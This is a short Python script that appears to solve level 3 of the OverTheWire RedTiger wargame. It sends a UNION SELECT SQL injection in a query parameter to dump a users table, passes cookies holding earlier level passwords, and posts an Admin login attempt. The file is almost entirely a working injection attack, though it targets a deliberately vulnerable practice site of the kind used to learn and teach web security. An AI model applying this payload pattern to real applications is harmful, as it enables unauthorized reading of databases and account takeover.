import requests

TARGET_URL = "https://redtiger.labs.overthewire.org/level3.php"

header = {'Cookie': "level2login=passwords_will_change_over_time_let_us_do_a_shitty_rhyme; level3login=feed_the_cat_who_eats_your_bread"}

payload = {"usr": "MDQyMjExMDE0MTgyMTQw UNION SELECT * FROM level3_users"}
response = requests.get(TARGET_URL, headers=header, params=payload)
print(response.text)

payload2 = {"user": "Admin", "password": "fdj", "login": "Login"}
response = requests.post(TARGET_URL, headers=header, data=payload2)
print(response.text)
